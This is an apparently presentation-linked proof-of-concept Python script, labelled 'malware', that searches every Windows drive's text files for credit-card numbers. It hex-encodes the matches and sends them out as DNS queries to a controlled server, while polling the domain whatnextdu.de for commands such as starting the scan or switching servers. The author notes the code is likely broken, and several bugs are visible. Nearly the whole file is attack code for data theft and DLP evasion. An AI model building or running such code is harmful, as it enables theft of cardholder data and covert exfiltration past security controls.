############################################################################################################
# Alter rocks!
# Proof of Concept 'malware'
# Used in conjunction with a presentation given to InfraGard Milwaukee
# Simple Encoding For DLP Evasion: Exfiltrating Sensitive Data Without Leaving A Trace
# Created by: @GraphX
# 
#
# Note:  This is likely broken because I messed with it a bunch of times without further testing
############################################################################################################

import os
import platform
import string
import glob
import ctypes
import itertools
import re
import binascii
import DNS
import time
#Functions start
def DNSLookup(hexline,srv):
    try:
        n = hexline + '.google.com'
        d = DNS.DnsRequest(name='n',server='srv',timeout=0,retry=0)
        d.req()
    except:
        pass
#Stole this from some blog I can't remember where anymore.
def cc_check(cc_number):
    AMEX_CC_RE = re.compile(r"^.*3[47][0-9]{13}.*$")
    VISA_CC_RE = re.compile(r"^.*4[0-9]{12}(?:[0-9]{3})?.*$")
    MASTERCARD_CC_RE = re.compile(r"^.*5[1-5][0-9]{14}$.*")
    DISCOVER_CC_RE = re.compile(r"^.*6(?:011|5[0-9]{2})[0-9]{12}$.*")
    
    CC_MAP = {"American Express": AMEX_CC_RE, "Visa": VISA_CC_RE,
              "Mastercard": MASTERCARD_CC_RE, "Discover": DISCOVER_CC_RE}    
    
    for type, regexp in CC_MAP.items():
        if regexp.match(str(cc_number)):
            return type    
    return None

def compress(data, selectors):
    for d, s in zip(data, selectors):
        if s:
            yield d
			

def get_available_drives():
    if 'Windows' not in platform.system():
        return []
    drive_bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    return list(itertools.compress(string.ascii_uppercase, map(lambda x:ord(x) - ord('0'), bin(drive_bitmask)[:1:-1])))
def scrub_and_send(srv):
    d = get_available_drives
    for l in d:
        os.chdir(l + ':')
        for root, dirs, files in os.walk("/"):
                for file in files:
                        if file.endswith(".txt"):
                                f = open(os.path.join(root, file))
                                try:
                                    for line in f:
                                        something = cc_check(line)
                                        if something != None:
                                            h = line.encode("hex")
                                            DNSLookup(h,srv)
                                finally:
                                    f.close()
def change_server_ip(srv):
    d = DNS.DnsRequest(name='newserv.whatnextdu.de',server='srv')
    r = d.req()
    for answer in r.answers:
        return answer['data']

#Main program



srv = "10.10.3.110"
while True:
    d = DNS.DnsRequest(name='whatnextdu.de',server='srv')
    r = d.req()
    for answer in r.answers:
        print answer['data']
        if answer['data'] == '192.168.0.1':
            print "Doing scrub and send"
            scrub_and_send(srv)
            print "and now we sleep"
        if answer['data'] == '192.168.0.2':
            print "We'll figure out what to do here later"
        if answer['data'] == '192.168.0.3':
            nip = change_server_ip(srv)
            print nip
            srv = 'nip'
            print srv
    time.sleep(60)
    
